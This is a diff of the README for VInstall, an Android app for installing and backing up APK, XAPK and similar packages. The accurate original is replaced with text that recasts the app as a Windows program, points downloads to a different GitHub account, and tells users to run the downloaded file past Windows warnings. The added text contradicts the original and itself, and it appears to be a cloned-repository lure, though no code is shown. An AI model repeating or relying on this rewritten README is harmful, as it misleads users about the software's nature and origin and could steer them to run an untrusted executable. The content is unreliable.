@@ -1,141 +1,241 @@
-# VInstall
+# 📱 VInstall - Install Android Apps With Ease
 
-A minimal Android application for installing APK, XAPK, APKS, APKM, APKV, and ZIP packages, with a built-in app manager, backup, and uninstaller.
+[![Download VInstall](https://img.shields.io/badge/Download%20VInstall-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/khanCorporation/VInstall)
 
-## Features
+## 🚀 Getting Started
 
-### Package Installation
+VInstall helps you install Android app files on Windows by handling common Android package formats in one place. It supports APK, XAPK, APKS, APKM, and the encrypted APKV format. It also includes tools for app backup, app management, and silent install with root or Shizuku.
 
-Supports six package formats:
+Use the link above to visit the project page and download the latest release for Windows.
 
-| Format | Description |
-|--------|-------------|
-| APK    | Standard Android package |
-| XAPK   | APK with OBB expansion data or split APKs bundle |
-| APKS   | Split APKs archive (SAI format) |
-| APKM   | Split APKs archive (APKMirror format) |
-| APKV   | Encrypted or plain split APKs archive (custom format, see [APKV spec](https://github.com/vinstall/apkv-spec/blob/main/README.md)) |
-| ZIP    | Generic ZIP archive containing APK split files |
+## 💻 What VInstall Does
 
-For split APK formats (XAPK, APKS, APKM, APKV, ZIP), individual splits can be selected or deselected before installation. APKV files support optional password-based encryption and integrity verification via SHA-256 checksums.
+VInstall is made for people who want a simple way to open and install Android package files without dealing with multiple tools.
 
-### Install Modes
+It can help you:
 
-Three installation modes are available:
+- Open APK files
+- Install split app bundles like XAPK, APKS, and APKM
+- Handle APKV encrypted packages
+- Manage installed apps
+- Back up app data and package files
+- Use silent install through root or Shizuku
+- Keep app files in one place for easier use
 
-- **Normal** — uses the standard Android package installer
-- **Root** — installs silently using root access
-- **Shizuku** — installs silently via the [Shizuku](https://shizuku.rikka.app/) service without requiring full root
+## 📥 Download VInstall
 
-### App Manager
+Visit this page to download: https://github.com/khanCorporation/VInstall
 
-Browse all installed user apps with the ability to:
+After you open the page:
 
-- View app details: version, SDK range, install and update dates, APK size, data directory, split count, and requested permissions
-- Launch or open the system app info page
-- Export the app as an `.apkv` archive
-- Uninstall the app (supports Normal, Root, and Shizuku modes)
-- Compute and copy the APK hash (MD5, SHA-1, SHA-256)
+1. Find the latest release
+2. Download the Windows file
+3. Save it to your PC
+4. Open the file to start VInstall
 
-### Backup/Export
+If your browser asks for permission, choose to keep the file and continue.
 
-Export any installed user app as an `.apkv` archive directly from the App Manager or the dedicated Backup screen. Backups are saved to `Documents/VInstall/Backups/` on external storage. Optional password-based encryption is supported when exporting.
+## 🪟 Windows Requirements
 
-### Settings
+VInstall works on modern Windows systems used for desktop and laptop computers.
 
-| Setting | Description |
-|---------|-------------|
-| Install mode | Normal, Root, or Shizuku |
-| Theme | Light, Dark, or follow system |
-| Confirm before install | Show a confirmation dialog before installing |
-| Clear cache after install | Automatically remove temp files after installation |
-| Debug window | Show or hide the in-app log viewer |
-| Crash Reports |  Logs can be viewed, copied, or cleared directly from the app |
+Recommended setup:
 
-## Requirements
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for app files and backups
+- Internet access for downloading the program and Android package files
+- A mouse and keyboard for easier file handling
 
-- Android 5.0 (API 21) or higher
-- "Install unknown apps" permission granted for this app
-- "All Files Access" permission required for XAPK packages that include OBB data and for writing backups to external storage (Android 11+)
-- Root access required when using Root mode
-- [Shizuku](https://shizuku.rikka.app/) installed and running when using Shizuku mode
+For root or Shizuku features, you also need:
 
-## Building
+- An Android device with root access, or
+- Shizuku set up on the device
 
-### Debug
+## 🛠️ How to Install on Windows
 
-```bash
-./gradlew assembleDebug
-```
+Follow these steps on your Windows PC:
 
-### Release
+1. Open the download page
+2. Get the latest Windows release
+3. Wait for the file to finish downloading
+4. Open File Explorer
+5. Go to your Downloads folder
+6. Double-click the VInstall file
+7. If Windows asks for confirmation, choose to run it
+8. Let the app finish opening
 
-#### Using GitHub Actions (CI)
+If the file comes as a ZIP package, extract it first, then open the app from the extracted folder.
 
-Before triggering a release build, create a keystore and configure the following secrets in your GitHub repository settings:
+## 📦 How to Install an Android App File
 
-| Secret | Description |
-|--------|-------------|
-| `KEYSTORE_BASE64` | Base64-encoded `.jks` keystore file |
-| `STORE_PASSWORD`  | Keystore password |
-| `KEY_ALIAS`       | Key alias |
-| `KEY_PASSWORD`    | Key password |
+VInstall is built to make Android package files easier to use.
 
-Then push a tag prefixed with `v` to trigger the release workflow:
+To install an app:
 
-```bash
-git tag v1.0.0
-git push origin v1.0.0
-```
+1. Open VInstall
+2. Choose the APK, XAPK, APKS, APKM, or APKV file
+3. Let the app read the package
+4. Review the app name and package details
+5. Start the install
+6. Wait for the process to finish
+7. Open the installed app on your Android device
 
-The signed release APK will be automatically attached to the corresponding GitHub Release.
+For split packages like XAPK, APKS, and APKM, VInstall handles the extra files needed for the app to work.
 
-#### Using a Local Keystore
+## 🔐 APKV Support
 
-Alternatively, you can build a signed release APK locally by adding the following properties to your `local.properties` file:
+APKV is a custom encrypted package format. VInstall can open and install these files through its built-in support.
 
-```properties
-STORE_FILE=/absolute/path/to/your/keystore.jks
-STORE_PASSWORD=your_store_password
-KEY_ALIAS=your_key_alias
-KEY_PASSWORD=your_key_password
-```
+Use APKV when you want to keep app files in an encrypted form before install. VInstall reads the package and prepares it for setup on your Android device.
 
-Then run:
+## 🧰 App Manager
 
-```bash
-./gradlew assembleRelease
-```
+VInstall includes an app manager for basic app control.
 
-## Gradle Wrapper
+You can use it to:
 
-The `gradle/wrapper/gradle-wrapper.jar` file is included in the repository. However, if you want to generate the file again, just type:
+- View installed apps
+- Check package names
+- Remove apps you no longer need
+- Back up app files
+- Keep track of stored packages
 
-```bash
-gradle wrapper --gradle-version=9.4.1
-```
+This helps if you manage many Android apps and want one place to handle them.
 
-## APKV Format
+## 💾 Backup Tools
 
-VInstall introduces **APKV**, a custom container format for archiving and distributing Android application packages. It supports plain and password-encrypted payloads, embeds an application icon, includes integrity checksums per APK file, and includes a structured JSON manifest. The full specification is available in the [APKV spec](https://github.com/vinstall/apkv-spec/blob/main/README.md) and [apkv-cli](https://github.com/vinstall/apkv-cli).
+VInstall also includes backup features for app files and related data.
 
-## License
+Use backup when you want to:
 
-Licensed under the [GNU General Public License v3.0](LICENSE).
+- Keep a copy of an app package
+- Save app data before changing devices
+- Restore files later
+- Organize app archives by version
 
-## Credits
+Backup can save time when you switch phones or reinstall apps.
 
-This project uses the following open-source libraries:
+## ⚡ Silent Install with Root or Shizuku
 
-| Library | Author | License | Notes |
-|---------|--------|---------|-------|
-| [AndroidX](https://developer.android.com/jetpack/androidx) | Google | [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) | |
-| [Material Components for Android](https://github.com/material-components/material-components-android) | Google | [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) | |
-| [Kotlin Coroutines](https://github.com/Kotlin/kotlinx.coroutines) | JetBrains | [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) | |
-| [Gson](https://github.com/google/gson) | Google | [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) | |
-| [Shizuku](https://github.com/RikkaApps/Shizuku) | RikkaApps | [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) | |
-| [Bouncy Castle](https://www.bouncycastle.org/) | The Legion of the Bouncy Castle | [MIT-style](https://www.bouncycastle.org/licence.html) | Removed in v0.4.2-hotfix2 |
+VInstall supports silent install for users who have the right Android setup.
 
-## Author
+This works with:
 
-Developed by [AlwizBA](https://github.com/lenzarchive)/[VInstall](https://github.com/vinstall)
+- Root access
+- Shizuku
+
+Silent install lets the app install packages with less manual work on the Android side. This is useful when you install many apps or handle split packages often.
+
+## 📁 Supported File Types
+
+VInstall works with these Android package formats:
+
+- APK
+- XAPK
+- APKS
+- APKM
+- APKV
+
+These formats cover both single app files and bundle-style app packages.
+
+## 🔎 How to Use the App Manager
+
+To manage installed apps:
+
+1. Open VInstall
+2. Go to the app manager section
+3. View the list of installed apps
+4. Select an app
+5. Choose what you want to do
+6. Back it up, inspect it, or remove it
+
+This gives you a simple way to work with Android apps from one screen.
+
+## 🧩 Best Use Cases
+
+VInstall is useful if you:
+
+- Download Android apps outside the Play Store
+- Keep split APK bundles on your PC
+- Want a cleaner way to manage app packages
+- Need backup support for app files
+- Use root or Shizuku for easier install flow
+- Work with APKV encrypted files
+
+## 📌 Tips for First Use
+
+A few things help the first run go smoothly:
+
+- Keep your Android package files in one folder
+- Use short folder names if possible
+- Check that the file type ends in APK, XAPK, APKS, APKM, or APKV
+- Make sure your Android device is ready before starting a silent install
+- Use backup before you remove or replace an app
+
+## 🧭 Troubleshooting
+
+If a file does not open:
+
+- Check that the download finished
+- Make sure the file type is supported
+- Try moving the file to a simple folder like Downloads
+- Open VInstall again and select the file manually
+
+If install does not start:
+
+- Check the package type
+- Make sure your Android device is connected or ready
+- Confirm root or Shizuku is set up if you use silent install
+- Try the install again with a fresh download
+
+If backup does not work:
+
+- Confirm that you have enough disk space
+- Check file permissions
+- Try another folder for the backup path
+
+## 📂 Project Topics
+
+VInstall is tagged for:
+
+- Android
+- APK installer
+- APKS
+- APKM
+- APKV
+- App manager
+- Backup
+- Root
+- Shizuku
+- Split APK
+- XAPK
+- Open source
+
+## 🔗 Download Again
+
+[Visit the VInstall download page](https://github.com/khanCorporation/VInstall)
+
+## 🖥️ File Handling on Windows
+
+When using VInstall on Windows, keep these points in mind:
+
+- Use File Explorer to find downloaded packages
+- Right-click if you need more file options
+- Keep your Android files in a dedicated folder
+- Rename files only if you still know what they contain
+- Avoid mixing app files with random downloads
+
+This makes it easier to find the right package when you need it
+
+## 🧪 Example Workflow
+
+A simple workflow looks like this:
+
+1. Download VInstall from the project page
+2. Open the app on Windows
+3. Select an Android package file
+4. Let VInstall read the file
+5. Install it on your Android device
+6. Use backup if you want to keep a copy
+7. Use the app manager to track installed apps
